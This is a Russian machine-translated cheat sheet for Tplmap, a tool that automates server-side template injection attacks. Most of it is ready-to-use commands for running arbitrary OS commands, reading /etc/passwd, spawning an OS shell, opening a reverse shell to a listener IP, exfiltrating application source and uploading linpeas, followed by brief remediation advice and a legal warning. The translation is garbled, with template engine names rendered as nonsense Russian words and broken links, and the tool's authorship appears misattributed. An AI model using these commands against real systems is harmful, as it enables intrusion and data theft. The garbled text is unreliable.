<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Веб-безопасность и API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Template Engines">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Лицензия GPLv2">
</p>

<p выравнивание="центр">
  <b>🌐 Инструмент автоматической эксплуатации, предназначенный для обнаружения и использования уязвимостей внедрения шаблонов на стороне сервера (SSTI) для обеспечения удаленного выполнения кода</b>
</p>

---

## 📋 Содержание

- [Обзор и уязвимость SSTI](#-overview--ssti-vulnerability)
- [Поддерживаемые шаблонизаторы](#-supported-template-engines)
- [Установка](#-установка)
- [Базовое обнаружение уязвимостей](#-basic-vulnerability-detection)
- [Нацеливание на конкретные точки введения (маркер `*`)](#-нацеливание на конкретные-точки введения--маркер)
- [Удаленное выполнение команд (`--os-cmd`)](#-remote-command-execution---os-cmd)
- [Интерактивные оболочки и обратные соединения](#-interactive-shells--reverse-connections)
- [Загрузка и скачивание файлов](#-file-upload--download)
- [Тестирование данных и заголовков POST](#-testing-post-data--headers)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и исправление](#-защитные-соображения--восстановление)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и уязвимость SSTI

**Внедрение шаблонов на стороне сервера (SSTI)** происходит, когда приложение встраивает непроверенные пользовательские данные непосредственно в шаблон на стороне сервера, а не передает их в качестве данных для обработки. Поскольку современные механизмы шаблонов допускают такой синтаксис, как `{{7*7}}` или `${7*7}`, злоумышленники могут выйти из «песочницы» и получить доступ к базовой среде выполнения (Python, Java, PHP, Ruby, Node.js).

Написанный **Мирославом Стампаром** и **Эмилио Пинной**, **Tplmap** действует как «SQLMap для шаблонизаторов». Он автоматически определяет активный механизм шаблонов, выходит из контекста оценки шаблона и переводит выполнение кода на полный доступ к оболочке на уровне ОС.

---

## 🧩 Поддерживаемые шаблонизаторы

| Язык | Поддерживаемые шаблонизаторы |
|----------|----------------------------|
| **Питон** | Джинджа2, Мако, Торнадо, Нанджакс |
| **PHP** | Веточка, Умник |
| **Ява** | Фримаркер, Скорость |
| **Рубин** | Еврорадио, Тонкий |
| **Node.js** | Джейд, Мопс, Dust.js |

---

## 📥 Установка

Tplmap построен на Python:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Базовое обнаружение уязвимостей
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Удаленное выполнение команд (`--os-cmd`)

Как только Tplmap обнаружит движок (например, Jinja2), напрямую выполните произвольные команды оболочки:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Интерактивные оболочки и обратные соединения
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Загрузка и скачивание файлов

Удалите исходный код или загрузите инструменты сохранения:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 Тестирование POST-данных и заголовков
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Обнаружение SSTI в URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Выполнение удаленной команды** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Интерактивный терминал** | `python tplmap.py -u "<URL>" --os-shell` |
| **Отбросить обратную оболочку** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Загрузить удаленный файл** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Загрузить локальный файл** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Тестовое сообщение POST** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Соображения по поводу защиты и исправления

1. **Контекстно-зависимое экранирование.** Никогда не объединяйте необработанные пользовательские данные в строки шаблона. Используйте собственный механизм привязки переменных шаблонизатора (например, в Jinja2: `render_template('hello.html', name=user_input)`, а не `render_template_string(f"Hello {user_input}")`).
2. **Ограничения песочницы.** Обеспечьте строгую изолированность в движках, где динамический рендеринг неизбежен, запретив доступ к `__class__`, `__mro__` или объектам отражения.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Tplmap выполняет произвольный удаленный код на целевых серверах приложений. Тестирование или использование веб-приложений без предварительного письменного разрешения строго противозаконно.